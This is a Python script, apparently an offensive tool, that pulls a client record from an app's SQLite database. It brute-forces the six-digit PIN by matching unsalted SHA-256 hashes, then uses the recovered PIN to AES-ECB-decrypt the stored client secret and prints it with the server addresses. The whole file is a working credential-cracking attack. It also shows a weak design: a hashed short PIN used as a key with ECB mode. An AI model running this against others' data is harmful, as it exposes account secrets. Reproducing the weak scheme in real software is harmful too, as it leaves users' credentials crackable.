#!/usr/bin/env python3

import argparse
import hashlib
import subprocess
import sys
from Crypto.Cipher import AES


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-d',
                        '--database',
                        dest='database',
                        help='The SQLite Database filename')
    options = parser.parse_args()
    if not options.database:
        parser.error(
            '[-] Please specify the SQLite database, use --help for more info.'
        )
    return options


def generate_symmetric_key(encryptPin):
    salt = hashlib.sha256(encryptPin.encode()).digest()
    return hashlib.pbkdf2_hmac('sha256', encryptPin.encode(), salt, 10000)


def aes_encrypt_ecb(encryptPin, encoded_bytes):
    symmetric_key = generate_symmetric_key(encryptPin)
    cipher = AES.new(symmetric_key, AES.MODE_ECB)
    return cipher.encrypt(encoded_bytes)


def aes_decrypt_ecb(encryptPin, encrypted_bytes):
    symmetric_key = generate_symmetric_key(encryptPin)
    cipher = AES.new(symmetric_key, AES.MODE_ECB)
    return cipher.decrypt(encrypted_bytes)


def print_message(message):
    sys.stdout.write('\r[*] %s' % message)
    sys.stdout.flush()

def print_client(client):
    if client:
        print('\n[*] CLIENT INFO -- %s' % client['id'])
        for key in client.keys():
            print('[+]    %s: %s' % (key, client[key]))


def brute_force(encrypted_client):
    print('[*] Bruteforce PIN for client "%s"' % encrypted_client['id'])
    client_pin_hexdigest = encrypted_client['pin'].hex()
    for pin in ['{:06d}'.format(i) for i in range(0, 1000000)]:
        hexdigest = hashlib.sha256(pin.encode()).hexdigest()
        print_message('%s %s' % (pin, hexdigest))
        if hexdigest == client_pin_hexdigest:
            encrypted_client['pin'] = pin
            encrypted_client['secret'] = aes_decrypt_ecb(pin, encrypted_client['secret']).decode()
            print('')
            return encrypted_client
    print('[-] Cannot find the PIN')


def get_client_info(database):
    sql_query = 'SELECT cid, xsip, asip,hex(csecret), hex(checkpin) FROM Clients LIMIT 1'
    cmd = ['sqlite3', database, sql_query]
    # python 3 return bytes, python2 return str
    client = subprocess.check_output(cmd).strip()
    if type(client) is bytes:
        client = client.decode()

    client = client.split('|')
    client = {
        'xmpp_ip': client[1],
        'auth_ip': client[2],
        'id': client[0],
        'secret': bytes.fromhex(client[3]),
        'pin': bytes.fromhex(client[4])
    }
    return client


options = get_arguments()
database = options.database

encrypted_client = get_client_info(database)

client = brute_force(encrypted_client)
print_client(client)
